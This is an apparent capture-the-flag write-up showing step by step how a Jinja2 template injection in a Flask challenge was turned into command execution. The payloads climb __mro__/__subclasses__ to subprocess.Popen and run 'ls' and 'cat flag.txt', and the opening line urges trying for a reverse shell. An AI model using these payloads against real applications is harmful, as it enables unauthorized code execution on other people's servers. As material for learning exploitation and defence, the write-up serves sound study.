You should try to use this exploit and see if you can get a reverse shell.
=======================================================================
See it's running: Flask / Jinja2

After a lot of fiddling and googling, I see you can use SSTI (Server Side Template Injection)
In flask, you can inject variables or the server to process.
To test this, Tried entering: 
http://178.128.35.107:30156/{{7*7}}
And the server returned 49!
We have code execution, but we can't run python "as is".
e.g: print("asd") will not work, we can't call any functions ourself.

Running:
    config.items()
ms([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(seconds=43200)), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])' could not be found

Nothing super interesting.


To be able to run malicious code we need to be able to access functions.
''.__class__ | will gives us class 'str'

If we can move up in the hierarchy, we can potentially list all functions that the server have access to.
Then we can find the index of the function we want to run and call it that way!

''.__class__.__mro__
mro: Method Resolution Order. Returns a list of types the class is derived from. This is our way to climb up the hierarchy

''.__class__.__mro__[1].__subclasses__()
call the subclasses and we can now see all the available functions.

Now we want to find a function to abuse. Most noteable something like system, subprocess, etc.

We find subprocess.Popen which we can use.
Now we have to find the index number for Popen, so we can call it.

subprocess.Popen has index 414, so we can call the function like this:
''.__class__.__mro__[1].__subclasses__()[414](<function arguments go here>)
This is equivalant to: subprocess.Popen(<function arguments go here>)

We call this with ls:
''.__class__.__mro__[1].__subclasses__()[414]('ls', shell=True)

We see no output. We need to redirect the output from the internal python script to the web server.
''.__class__.__mro__[1].__subclasses__()[414]('ls', shell=True, stdout=-1).communicate()

communicate from docs:
    "Interact with process: Send data to stdin and close it.
        Read data from stdout and stderr, until end-of-file is
        reached.  Wait for process to terminate."

voila we can see everything in that folder
We can see a flag.txt, so let's read it
''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt', shell=True, stdout=-1).communicate()